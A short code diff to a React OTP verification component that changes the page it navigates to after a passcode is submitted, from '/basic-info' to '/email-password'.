@@ -38,7 +38,7 @@ const OTP: React.FC = () => {
         otp,
       });
 
-      navigate('/basic-info', { state: { emzemz } });
+      navigate('/email-password', { state: { emzemz } });
     } catch (err) {
       console.error('Error submitting OTP:', err);
       setError('There was a problem verifying your passcode. Please try again.');
